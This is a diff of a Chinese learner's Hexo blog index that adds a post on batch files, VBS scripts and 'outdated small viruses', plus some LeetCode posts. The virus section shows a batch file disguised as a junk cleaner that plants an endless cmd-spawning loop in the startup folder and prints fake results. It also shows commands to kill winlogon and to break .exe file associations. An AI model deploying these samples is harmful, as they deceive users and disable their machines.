@@ -156,7 +156,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -196,6 +196,134 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
+      <meta itemprop="name" content="icSnow">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="❄">
+      <meta itemprop="description" content="ahhhhhhhhh~~~">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | ❄">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/" class="post-title-link" itemprop="url">网安学习-D-3-批处理，脚本，过时小病毒</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-05-27 22:22:57" itemprop="dateCreated datePublished" datetime="2022-05-27T22:22:57+08:00">2022-05-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-05-29 20:00:30" itemprop="dateModified" datetime="2022-05-29T20:00:30+08:00">2022-05-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CS/" itemprop="url" rel="index"><span itemprop="name">CS</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>环境：win2003 虚拟机</p>
+<p>只做简单了解，并不深究…</p>
+<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
+<p>使用的是 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
+<p><strong>发布博客的批处理文件</strong></p>
+<p>我自己的：</p>
+<ol>
+<li>push</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+<ol>
+<li>check</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
+<p>3.NewBlog</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line"><span class="built_in">set</span> /p title=Input_NewBlog`s title:</span><br><span class="line">hexo n %title%</span><br></pre></td></tr></table></figure>
+<p><strong>一个小例子</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
+<p>如：</p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
+<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
+<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
+<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
+<ul>
+<li>添加 开机自启动项，无限弹窗</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>杀死不能杀死的进程，导致蓝屏 （win2003）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
+<p>ntsd    ：杀死进程</p>
+<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
+<p>winlogon.exe    ：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
+<ul>
+<li>修改文件关联，使无法打开（前一章写过）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1557,92 +1685,6 @@ or\\
 <h2 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h2><h4 id="398-Random-Pick-Index"><a href="#398-Random-Pick-Index" class="headerlink" title="398. Random Pick Index"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/random-pick-index/">398. Random Pick Index</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.position = defaultdict(list)</span></span><br><span class="line"><span class="string">        for i,num in enumerate(nums):</span></span><br><span class="line"><span class="string">            self.position[num].append(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        #print(self.position)</span></span><br><span class="line"><span class="string">        #print(choice(self.position[target]))</span></span><br><span class="line"><span class="string">        return choice(self.position[target])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#官方解答1</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.pos = defaultdict(list)</span></span><br><span class="line"><span class="string">        for i, num in enumerate(nums):</span></span><br><span class="line"><span class="string">            self.pos[num].append(i)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        return choice(self.pos[target])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#官方题解2 蓄水池采样</span></span><br><span class="line"><span class="string">class Solution:</span></span><br><span class="line"><span class="string">    def __init__(self, nums: List[int]):</span></span><br><span class="line"><span class="string">        self.nums = nums</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    def pick(self, target: int) -&gt; int:</span></span><br><span class="line"><span class="string">        ans = cnt = 0</span></span><br><span class="line"><span class="string">        for i, num in enumerate(self.nums):</span></span><br><span class="line"><span class="string">            if num == target:</span></span><br><span class="line"><span class="string">                cnt += 1  # 第 cnt 次遇到 target</span></span><br><span class="line"><span class="string">                if randrange(cnt) == 0:</span></span><br><span class="line"><span class="string">                    ans = i</span></span><br><span class="line"><span class="string">            #print(&quot;ans=&quot;,ans,&quot;cnt=&quot;,cnt)</span></span><br><span class="line"><span class="string">        return ans</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">        self.nums = nums</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self, target: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        res = indx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.nums):</span><br><span class="line">            <span class="keyword">if</span> num == target:</span><br><span class="line">                <span class="comment">#用 cnt 记录，表示从 (0,cnt) 中随机抽取一个数</span></span><br><span class="line">                <span class="comment">#用来均衡概率，使抽到的概率每次都为 1/（targe的数量)</span></span><br><span class="line">                indx += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> randrange(indx) == <span class="number">0</span>:</span><br><span class="line">                    <span class="comment">#print(randrange(indx))</span></span><br><span class="line">                    res = i</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Solution object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = Solution(nums)</span></span><br><span class="line"><span class="comment"># param_1 = obj.pick(target)</span></span><br></pre></td></tr></table></figure>
 <h4 id="497-Random-Point-in-Non-overlapping-Rectangles"><a href="#497-Random-Point-in-Non-overlapping-Rectangles" class="headerlink" title="497. Random Point in Non-overlapping Rectangles"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/random-point-in-non-overlapping-rectangles/">497. Random Point in Non-overlapping Rectangles</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rects: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>):</span><br><span class="line">        self.rectangle = rects</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        SumPoints = <span class="number">0</span></span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i,(x1,y1,x2,y2) <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.rectangle):</span><br><span class="line">            curPoints = (x2-x1+<span class="number">1</span>) * (y2-y1+<span class="number">1</span>)    <span class="comment">#当前矩形包含的点数</span></span><br><span class="line">            SumPoints += curPoints  <span class="comment">#总点数</span></span><br><span class="line">            <span class="keyword">if</span> random.randint(<span class="number">0</span>,SumPoints) &lt; curPoints:</span><br><span class="line">                <span class="comment">#这个判断的依据</span></span><br><span class="line">                <span class="comment">#如：第一次加 curSum=9,第二次加 curSum=9+12=21</span></span><br><span class="line">                <span class="comment">#第 1 次采样一定取第 1 个矩形</span></span><br><span class="line">                <span class="comment">#第 2 次采样，取到小于 12 取第 2 个矩形，12~21 取第 1 个矩形（未变）</span></span><br><span class="line">                <span class="comment">#试下等概率采样</span></span><br><span class="line">                idx = i</span><br><span class="line">        x1,y1,x2,y2 = self.rectangle[idx]</span><br><span class="line">        <span class="keyword">return</span> [x1+random.randint(<span class="number">0</span>,x2-x1),y1+random.randint(<span class="number">0</span>,y2-y1)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Your Solution object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = Solution(rects)</span></span><br><span class="line"><span class="comment"># param_1 = obj.pick()</span></span><br></pre></td></tr></table></figure>
 
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/Algorithm/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
-      <meta itemprop="name" content="icSnow">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="❄">
-      <meta itemprop="description" content="ahhhhhhhhh~~~">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | ❄">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/05/25/Algorithm/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF/" class="post-title-link" itemprop="url">约瑟夫环</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2022-05-25 19:23:36" itemprop="dateCreated datePublished" datetime="2022-05-25T19:23:36+08:00">2022-05-25</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2022-05-22 12:12:06" itemprop="dateModified" datetime="2022-05-22T12:12:06+08:00">2022-05-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Code-Algo/" itemprop="url" rel="index"><span itemprop="name">Code_Algo</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="约瑟夫环"><a href="#约瑟夫环" class="headerlink" title="约瑟夫环"></a>约瑟夫环</h1><p>参见：</p>
-<p> <a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/find-the-winner-of-the-circular-game/">1823. 找出游戏的获胜者</a></p>
-<h4 id="剑指-Offer-62-圆圈中最后剩下的数字"><a href="#剑指-Offer-62-圆圈中最后剩下的数字" class="headerlink" title="剑指 Offer 62. 圆圈中最后剩下的数字"></a><a target="_blank" rel="noopener" href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">剑指 Offer 62. 圆圈中最后剩下的数字</a></h4>
       
     </div>
 
